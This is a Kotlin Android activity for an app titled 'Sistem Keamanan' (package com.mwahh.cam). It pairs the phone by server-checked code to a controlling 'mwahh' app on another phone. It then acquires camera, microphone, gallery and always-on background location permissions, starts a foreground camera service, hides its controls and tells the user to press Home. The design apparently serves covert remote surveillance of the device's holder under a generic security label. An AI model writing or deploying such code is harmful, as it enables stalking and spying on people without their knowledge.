package com.mwahh.cam

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.text.InputType
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import okhttp3.OkHttpClient
import okhttp3.Request
import java.util.concurrent.TimeUnit

// Hanya satu kolom kode + tombol Pasang. Kode diperiksa ke server dulu: kalau kode tidak
// dikenal atau sudah dipakai HP lain, ditolak dengan keterangan dan TIDAK disimpan.
// Setelah diterima, kode terkunci dan semua fitur dipakai dari aplikasi mwahh di HP utama.
class MainActivity : AppCompatActivity() {

    private lateinit var tvInfo: TextView
    private lateinit var etCode: EditText
    private lateinit var btnPasang: Button

    private val permLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { r ->
            if (r[Manifest.permission.CAMERA] == true && r[Manifest.permission.RECORD_AUDIO] == true) {
                afterPermsGranted()
            } else {
                tvInfo.text = "Izin kamera dan mikrofon harus diizinkan. Buka ulang aplikasi ini."
            }
        }

    // Izin lokasi "sepanjang waktu": dibutuhkan agar Lacak lokasi tetap jalan saat layar mati.
    private val bgLocLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { }

    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val box = LinearLayout(this)
        box.orientation = LinearLayout.VERTICAL
        box.setPadding(dp(24), dp(48), dp(24), dp(24))

        val title = TextView(this)
        title.text = "Sistem Keamanan"
        title.textSize = 26f
        box.addView(title)

        etCode = EditText(this)
        etCode.hint = "Kode sistem"
        etCode.inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS
        box.addView(etCode)

        btnPasang = Button(this)
        btnPasang.text = "Pasang"
        btnPasang.isAllCaps = false
        box.addView(btnPasang)

        tvInfo = TextView(this)
        tvInfo.setPadding(0, dp(16), 0, dp(16))
        box.addView(tvInfo)

        setContentView(box, ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT))

        btnPasang.setOnClickListener {
            val code = etCode.text.toString().trim()
            if (!Regex("^[A-Za-z0-9]{8,32}$").matches(code)) {
                tvInfo.text = "Kode tidak valid. Harus 8-32 huruf/angka, tanpa spasi atau simbol."
                return@setOnClickListener
            }
            verifyThenInstall(code)
        }

        if (Cfg.locked(this)) {
            showLocked()
            ensurePermsThenStart()
        } else {
            val notice = Cfg.takeNotice(this)
            if (notice.isNotEmpty()) tvInfo.text = notice
        }
    }

    // Tanya server dulu. Kode baru disimpan hanya kalau server menjawab OK.
    private fun verifyThenInstall(code: String) {
        btnPasang.isEnabled = false
        tvInfo.text = "Memeriksa kode…"
        Thread {
            val http = try {
                val client = OkHttpClient.Builder().callTimeout(15, TimeUnit.SECONDS).build()
                val req = Request.Builder().url(Cfg.claimUrl(this, code)).build()
                client.newCall(req).execute().use { it.code }
            } catch (e: Exception) {
                -1
            }
            runOnUiThread {
                btnPasang.isEnabled = true
                when (http) {
                    200 -> {
                        Cfg.lock(this, code)
                        showLocked()
                        ensurePermsThenStart()
                    }
                    404 -> tvInfo.text = "Kode tidak dikenal. Periksa kodenya, dan pastikan perangkat sudah ditambahkan di aplikasi mwahh."
                    409 -> tvInfo.text = "Kode ini sudah dipakai di HP lain. Lepas pasangannya di aplikasi mwahh, atau pakai kode yang berbeda."
                    410 -> {
                        Cfg.resetDevice(this)
                        tvInfo.text = "Pasangan lama di HP ini sudah dicabut. Tekan Pasang sekali lagi."
                    }
                    400 -> tvInfo.text = "Format kode salah."
                    -1 -> tvInfo.text = "Tidak ada internet atau server tidak terjangkau. Coba lagi."
                    else -> tvInfo.text = "Gagal memeriksa kode (kode $http). Coba lagi."
                }
            }
        }.start()
    }

    private fun showLocked() {
        etCode.setText("")
        etCode.visibility = View.GONE
        btnPasang.visibility = View.GONE
        tvInfo.text = "Terpasang (v2.8). Tekan tombol Home."
    }

    // Android 13+ memisahkan izin foto dan video; keduanya dibutuhkan agar galeri lengkap.
    private fun galleryPerms(): List<String> =
        if (Build.VERSION.SDK_INT >= 33)
            listOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO)
        else
            listOf(Manifest.permission.READ_EXTERNAL_STORAGE)

    private fun granted(p: String) =
        ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED

    private fun hasPerms(): Boolean =
        granted(Manifest.permission.CAMERA) &&
            granted(Manifest.permission.RECORD_AUDIO) &&
            granted(Manifest.permission.ACCESS_FINE_LOCATION) &&
            galleryPerms().all { granted(it) }

    private fun ensurePermsThenStart() {
        if (hasPerms()) {
            afterPermsGranted()
        } else {
            val need = arrayListOf(
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            )
            need.addAll(galleryPerms())
            if (Build.VERSION.SDK_INT >= 33) need.add(Manifest.permission.POST_NOTIFICATIONS)
            permLauncher.launch(need.toTypedArray())
        }
    }

    private fun afterPermsGranted() {
        startSvc()
        askBackgroundLocation()
    }

    private fun startSvc() {
        ContextCompat.startForegroundService(this, Intent(this, CameraService::class.java))
        tvInfo.text = "Terpasang (v2.8). Tekan tombol Home."
    }

    // Diminta sekali saja. Di Android 11+ sistem membuka halaman pengaturan izin lokasi;
    // pilih "Izinkan sepanjang waktu".
    private fun askBackgroundLocation() {
        if (Build.VERSION.SDK_INT < 29) return
        if (!granted(Manifest.permission.ACCESS_FINE_LOCATION)) return
        if (granted(Manifest.permission.ACCESS_BACKGROUND_LOCATION)) return
        val prefs = getSharedPreferences("cam", MODE_PRIVATE)
        if (prefs.getBoolean("bgAsked", false)) return
        prefs.edit().putBoolean("bgAsked", true).apply()
        AlertDialog.Builder(this)
            .setTitle("Izin lokasi")
            .setMessage("Supaya Lacak lokasi tetap jalan saat layar HP ini mati, pilih \"Izinkan sepanjang waktu\" di halaman berikutnya.")
            .setPositiveButton("Lanjut") { _, _ ->
                bgLocLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            }
            .setNegativeButton("Nanti", null)
            .show()
    }
}
